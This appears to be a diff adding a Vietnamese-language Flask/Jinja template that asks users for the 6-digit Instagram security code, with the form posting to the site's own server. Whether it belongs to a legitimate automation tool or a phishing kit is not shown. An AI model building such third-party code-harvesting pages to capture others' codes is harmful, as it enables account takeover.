@@ -1,0 +1,42 @@
+{% extends "layout.html" %}
+
+{% block content %}
+<div class="row justify-content-center">
+    <div class="col-md-6">
+        <div class="card">
+            <div class="card-header bg-warning text-white">
+                <h3 class="text-center">Nhập mã xác thực Instagram</h3>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <i class="bi bi-info-circle-fill"></i> Instagram yêu cầu xác thực bảo mật. Vui lòng nhập mã 6 chữ số đã được gửi đến email hoặc số điện thoại của bạn.
+                </div>
+                
+                <form method="post" action="{{ url_for('verification') }}">
+                    <div class="mb-3">
+                        <label for="verification_code" class="form-label">Mã xác thực 6 chữ số</label>
+                        <input type="text" class="form-control form-control-lg text-center" 
+                               id="verification_code" name="verification_code" 
+                               placeholder="123456" maxlength="6" required
+                               pattern="[0-9]{6}" inputmode="numeric">
+                        <div class="form-text">
+                            Nhập mã 6 chữ số mà Instagram đã gửi cho bạn.
+                        </div>
+                    </div>
+                    
+                    <div class="d-grid gap-2">
+                        <button type="submit" class="btn btn-primary btn-lg">Xác nhận</button>
+                        <a href="{{ url_for('login') }}" class="btn btn-outline-secondary">Quay lại đăng nhập</a>
+                    </div>
+                </form>
+            </div>
+            <div class="card-footer">
+                <div class="text-muted text-center small">
+                    <p class="mb-0">Mã xác thực thường có hiệu lực trong vòng 10 phút.</p>
+                    <p class="mb-0">Nếu không nhận được mã, vui lòng kiểm tra email/SMS hoặc thử đăng nhập lại.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
